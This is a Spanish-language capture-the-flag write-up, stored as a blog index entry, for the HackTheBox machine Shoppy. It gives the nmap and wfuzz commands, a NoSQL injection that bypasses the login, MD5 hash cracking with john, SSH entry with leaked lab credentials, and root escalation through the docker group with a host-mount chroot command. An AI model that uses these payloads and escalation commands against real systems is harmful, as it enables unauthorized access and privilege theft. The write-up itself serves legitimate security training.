[
  
  {
    "title": "Shoppy WriteUp",
    "url": "/posts/shoppy-writeup/",
    "categories": "hackthebox, machine, writeup",
    "tags": "hackthebox, writeup",
    "date": "2023-01-13 17:00:00 +0100",
    





    "snippet": "Les explicaré comó comprometer la máquina Shoppy de HackTheBox. En esta máquina nos enfretaremos a un NoSQLi de MongoDB y ganaremos acceso al sistema gracias a una contraseña filtrada y para la escalada nos vamos a aprovechar del grupo Docker.Escaneo NMAPAntes de empezar les recomiendo hacer un escaneo para saber que puertos estan abiertos y que servicios corren por ellos, ya que esta información nos sera util para continuar con la prueba de penetración.❯ nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.11.180 -oG allPortsHost discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.Starting Nmap 7.92 ( https://nmap.org ) at 2023-01-15 11:59 -04Initiating SYN Stealth Scan at 11:59Scanning 10.10.11.180 [65535 ports]Discovered open port 80/tcp on 10.10.11.180Discovered open port 22/tcp on 10.10.11.180Discovered open port 9093/tcp on 10.10.11.180Completed SYN Stealth Scan at 12:00, 15.14s elapsed (65535 total ports)Nmap scan report for 10.10.11.180Host is up, received user-set (0.16s latency).Scanned at 2023-01-15 11:59:53 -04 for 16sNot shown: 65368 closed tcp ports (reset), 164 filtered tcp ports (no-response)Some closed ports may be reported as filtered due to --defeat-rst-ratelimitPORT     STATE SERVICE REASON22/tcp   open  ssh     syn-ack ttl 6380/tcp   open  http    syn-ack ttl 639093/tcp open  copycat syn-ack ttl 63Read data files from: /usr/bin/../share/nmapNmap done: 1 IP address (1 host up) scanned in 15.33 seconds           Raw packets sent: 74269 (3.268MB) | Rcvd: 73540 (2.942MB)Nos percatamos que tiene el SSH abierto y el puerto 80 que corresponde al HTTP, al entrar a la web no vemos nada, ya que se esta aplicando virtual hosting, para solucionarlo hacemos lo siguiente:echo \"10.10.11.180       shoppy.htb\" | tee -a /etc/hostsAhora debemos ver una web con una cuenta regresiva, nada importanteEnumeraciónEnumerando directorios con WFUZZ nos encontramos lo siguiente.Nota: Debes tener clonado el repositorio de SecList❯ wfuzz -c --hc=404 -t 50 -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt http://shoppy.htb/FUZZ  2&gt;/dev/null********************************************************* Wfuzz 3.1.0 - The Web Fuzzer                         *********************************************************Target: http://shoppy.htb/FUZZTotal requests: 220560=====================================================================ID           Response   Lines    Word       Chars       Payload                                                                                                                =====================================================================000000053:   200        25 L     62 W       1074 Ch     \"login\"                                                                                                                000000016:   301        10 L     16 W       179 Ch      \"images\"                                                                                                               000000291:   301        10 L     16 W       179 Ch      \"assets\"                                                                                                               000000259:   302        0 L      4 W        28 Ch       \"admin\"   Nos encontramos con /login , intentamos acceder pero esta protegido por un login, podemos probar con una injección SQL y ver si es vulnerable a este tipo de ataque.Login ShoppyIntroducimos una comilla al final del usuario para ver si la query de la consulta es vulnerable a SQL injection, notamos que el servidor se demora en responder, por lo que confirmamos que es vulnerble.Login ShoppyPodemos seguir probando tipicas SQL injection, pero al final ninguna funcionará.''-- -' or '1'='1' or '1'='1'-- -Pero vemos que ninguna funciona, eso nos da una pista que debemos probar con una injección NoSQL, una base de las bases de datos mas usadas son MongoDB, buscando payloads en Google encontramos estos blogs MongoDB SQL injection y  este otro blog No SQl injection.Podemos probar admin'||'1==1 y poner cualquier contraseña:Bypass LoginBingo!!! Ganamos acceso como administrador, en el buscador podemos repetir la injección.Nos sale una opción para descargar un archivo JSON, cuando vemos el archivo vemos 2 usuarios y sus respectivos hashes. Creamos un archivo con los hashes y lo intentaremos crakear con johnecho \"admin:23c6877d9e2b564ef8b32c3a23de27b2\" &gt; hashesecho \"josh:6ebcea65320589ca4f2f1ce039975995\" &gt;&gt; hashes❯ john -w:/usr/share/wordlists/rockyou.txt hashes --format=Raw-MD5Using default input encoding: UTF-8Loaded 2 password hashes with no different salts (Raw-MD5 [MD5 256/256 AVX2 8x3])Warning: no OpenMP support for this hash type, consider --fork=8Press 'q' or Ctrl-C to abort, almost any other key for statusremembermethisway (josh)1g 0:00:00:02 DONE (2023-01-15 12:44) 0.4444g/s 6374Kp/s 6374Kc/s 6735KC/s  fuckyooh21..*7¡Vamos!Use the \"--show --format=Raw-MD5\" options to display all of the cracked passwords reliablySession completedTenemos una contraseña, podemos buscar por subdominios a ver que nos encontramos❯ gobuster vhost  -w /usr/share/SecLists/Discovery/DNS/bitquark-subdomains-top100000.txt -u http://shoppy.htb/ -t 200===============================================================Gobuster v3.1.0by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)===============================================================[+] Url:          http://shoppy.htb/[+] Method:       GET[+] Threads:      200[+] Wordlist:     /usr/share/SecLists/Discovery/DNS/bitquark-subdomains-top100000.txt[+] User Agent:   gobuster/3.1.0[+] Timeout:      10s===============================================================2023/01/15 12:48:41 Starting gobuster in VHOST enumeration mode===============================================================Found: mattermost.shoppy.htb (Status: 200) [Size: 3122]Progress: 52985 / 100001 (52.98%)    Tenemos un subdominio, la misma historia lo añadimos en el /etc/hosts.Al entrar en el web nos encontramos con estoLogin MattermostViendo las conversaciones nos dan un usuario y sus credenciales para el SSH, nos conectamos.Information leaked❯ ssh jaeger@10.10.11.180jaeger@10.10.11.180's password: Sh0ppyBest@pp!Linux shoppy 5.10.0-18-amd64 #1 SMP Debian 5.10.140-1 (2022-09-02) x86_64The programs included with the Debian GNU/Linux system are free software;the exact distribution terms for each program are described in theindividual files in /usr/share/doc/*/copyright.Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extentpermitted by applicable law.Last login: Sun Jan 15 11:02:26 2023 from 10.10.14.26manpath: can't set the locale; make sure $LC_* and $LANG are correctjaeger@shoppy:~$ export TERM=xtermjaeger@shoppy:~$ Una vez dentro podemos ver si tenemos algún privilegio asignado a sudo, vemos que podemos ejecutar como el usuario deploy un ejecutable.Enumeración del sistemajaeger@shoppy:~$ sudo -l[sudo] password for jaeger: Sh0ppyBest@pp!Matching Defaults entries for jaeger on shoppy:    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/binUser jaeger may run the following commands on shoppy:    (deploy) /home/deploy/password-managerjaeger@shoppy:~$ Intentamos ejecutar el comandojaeger@shoppy:~$ sudo -u deploy /home/deploy/passw*Welcome to Josh password manager!Please enter your master password: PasswordAccess denied! This incident will be reported !jaeger@shoppy:~$ La contraseña no es correcta, jugando con XXD podemos ver que la contraseña se filtra, bingo ya descubrimos la contraseña, ahora lo ejecutamos como el usuario deployPassword-Managerjaeger@shoppy:~$ sudo -u deploy /home/deploy/password-managerWelcome to Josh password manager!Please enter your master password: SampleAccess granted! Here is creds !Deploy Creds :username: deploypassword: Deploying@pp!jaeger@shoppy:~$ Podemos migrar al usuario Deploy .jaeger@shoppy:~$ su deployPassword: Deploying@pp!$ bashdeploy@shoppy:/home/jaeger$ deploy@shoppy:/home/jaeger$ iduid=1001(deploy) gid=1001(deploy) groups=1001(deploy),998(docker)deploy@shoppy:/home/jaeger$ Escalada de privilegiosPertenecemos al grupo docker  mirando GtfObins podemos ver que podemos abusar del grupo dockerEjecutamos el comando nos da una shell como root. deploy@shoppy:/home/jaeger$ docker run -v /:/mnt --rm -it alpine chroot /mnt bashroot@3ea87a82734f:/# Ganamos acceso root, ya rooteamos la máquina ahora podemos leer las  flags respectivas para cada usuario.root@3ea87a82734f:~# cat root.txt 3d4c1a0477********************66root@3ea87a82734f:~# cat /home/jaeger/user.txt 3d97fe0060********************67root@3ea87a82734f:~# "
  }
  
]

